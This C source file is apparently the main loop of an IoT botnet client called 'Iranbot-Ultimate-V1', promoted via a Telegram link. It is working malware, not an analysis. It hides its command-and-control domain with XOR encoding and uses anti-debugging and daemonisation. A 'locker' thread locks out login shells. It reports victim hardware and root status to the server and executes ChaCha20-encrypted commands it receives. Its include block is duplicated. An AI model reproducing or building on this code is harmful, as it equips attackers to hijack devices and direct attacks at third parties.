#define _GNU_SOURCE

#include "headers/attacks.h"
#include "headers/anti_debug.h"
#include "headers/daemon.h"
#include "headers/dns.h"
#include "headers/cipher.h"
#include "headers/locker.h"
#include "headers/parser.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/statvfs.h>
#include <sys/sysinfo.h>
#include <time.h>
#include <unistd.h>

/* ============ CONFIG: edit these ============ */
/* domain is XOR-encoded so it never appears in strings output */
static const uint8_t CNC_DOMAIN_ENC[] = {
    0x00, 0xfd, 0x00
};
#define CNC_PORT 8080
/* ============================================ */

static char cnc_domain[64] = {0};

static void cnc_domain_init(void) {
    size_t i;
    for (i = 0; i < sizeof(CNC_DOMAIN_ENC) - 1 && i < sizeof(cnc_domain) - 1; i++) {
        cnc_domain[i] = (char)(CNC_DOMAIN_ENC[i] ^ 0x5a);
    }
    cnc_domain[i] = '\0';
}

#include "headers/attacks.h"
#include "headers/anti_debug.h"
#include "headers/daemon.h"
#include "headers/dns.h"
#include "headers/cipher.h"
#include "headers/locker.h"
#include "headers/parser.h"
#include <time.h>
#include <unistd.h>

static const char *get_arch(void) {
#ifdef ARCH_aarch64
    return "aarch64";
#elif defined(ARCH_armv4l)
    return "armv4l";
#elif defined(ARCH_x86_32)
    return "x86_32";
#elif defined(ARCH_mips)
    return "mips";
#elif defined(ARCH_mipsel)
    return "mipsel";
#else
    return "unknown";
#endif
}

/* CNC frames: [len_hi len_lo][chacha20(cmd)]. HELLO stays plaintext. */
static int read_exact(int s, uint8_t *buf, size_t n) {
    size_t got = 0;
    while (got < n) {
        struct pollfd p = {s, POLLIN, 0};
        int r = poll(&p, 1, 10000);
        if (r < 0) return -1;
        if (r == 0) continue;
        ssize_t m = recv(s, buf + got, n - got, 0);
        if (m <= 0) return -1;
        got += (size_t)m;
    }
    return 0;
}

static int connect_timeout(struct in_addr addr, int port) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    d.sin_port = htons((uint16_t)port);
    d.sin_addr = addr;
    int r = connect(s, (struct sockaddr *)&d, sizeof(d));
    if (r < 0 && errno != EINPROGRESS) { close(s); return -1; }
    if (r < 0) {
        struct pollfd p = {s, POLLOUT, 0};
        if (poll(&p, 1, 5000) <= 0) { close(s); return -1; }
        int e = 0;
        socklen_t el = sizeof(e);
        getsockopt(s, SOL_SOCKET, SO_ERROR, &e, &el);
        if (e != 0) { close(s); return -1; }
    }
    fcntl(s, F_SETFL, fl);
    return s;
}

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    puts("Iranbot-Ultimate-V1 init: join t.me/flylegit");
    srand((unsigned)(time(NULL) ^ (getpid() << 16)));

    anti_debug_init();

    /* group comes from argv: snapshot before daemonize rewrites it */
    char group[64] = {0};
    if (argc > 1 && argv[1][0]) {
        strncpy(group, argv[1], sizeof(group) - 1);
    } else {
        strcpy(group, "default");
    }

    daemonize(argc, argv);

    cnc_domain_init();

    /* locker: one-shot no-.so sweep, then 1s login-shell lock.
       compile with -DKILLER_OFF to skip it for testing. */
#ifndef KILLER_OFF
    {
        pthread_t lt;
        pthread_attr_t at;
        pthread_attr_init(&at);
        pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);
        if (pthread_create(&lt, &at, locker_thread, NULL) != 0) {
            locker_run();
        }
        pthread_attr_destroy(&at);
    }
#endif

    /* resources for !bots -r: cpus / ram MB / free disk MB / rooted */
    long ncpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus <= 0) ncpus = 1;
    long ram_mb = 0, disk_mb = 0;
    {
        struct sysinfo si;
        if (sysinfo(&si) == 0 && si.totalram > 0) {
            unsigned long unit = si.mem_unit ? si.mem_unit : 1;
            ram_mb = (long)(((unsigned long long)si.totalram * unit) / (1024 * 1024));
        }
        struct statvfs sv;
        if (statvfs("/data", &sv) == 0 || statvfs("/", &sv) == 0) {
            disk_mb = (long)(((unsigned long long)sv.f_bavail * sv.f_frsize) / (1024 * 1024));
        }
    }
    int rooted = (getuid() == 0) ? 1 : 0;

    char hello[192];
    snprintf(hello, sizeof(hello), "HELLO %s %s %ld %ld %ld %d\n",
             get_arch(), group, ncpus, ram_mb, disk_mb, rooted);

    struct in_addr cnc_addr;
    memset(&cnc_addr, 0, sizeof(cnc_addr));
    int fails = 0;

    while (1) {
        if (dns_resolve(cnc_domain, &cnc_addr) != 0) {
            fails++;
            if (fails >= 100) _exit(0);
            usleep(1500000);
            continue;
        }
        int s = connect_timeout(cnc_addr, CNC_PORT);
        if (s < 0) {
            sleep(3);
            fails++;
            continue;
        }
        fails = 0;
        if (send(s, hello, strlen(hello), MSG_NOSIGNAL) <= 0) {
            close(s);
            sleep(3);
            continue;
        }
        /* encrypted command frames: [len_hi len_lo][chacha20(cmd)] */
        while (1) {
            uint8_t frame[4098];
            if (read_exact(s, frame, 2) != 0) break;
            size_t len = ((size_t)frame[0] << 8) | frame[1];
            if (len == 0 || len > 4096) break;
            if (read_exact(s, frame + 2, len) != 0) break;
            uint8_t dec[4097];
            size_t dl = sizeof(dec) - 1;
            if (recv_decrypt(frame, len + 2, dec, &dl) != 0) break;
            dec[dl] = '\0';
            while (dl > 0 && (dec[dl - 1] == '\n' || dec[dl - 1] == '\r')) dec[--dl] = '\0';
            if (dl > 0) handle_line((const char *)dec, s);
        }
        close(s);
        parser_stop();
        fails++;
        sleep(3);
    }
    return 0;
}
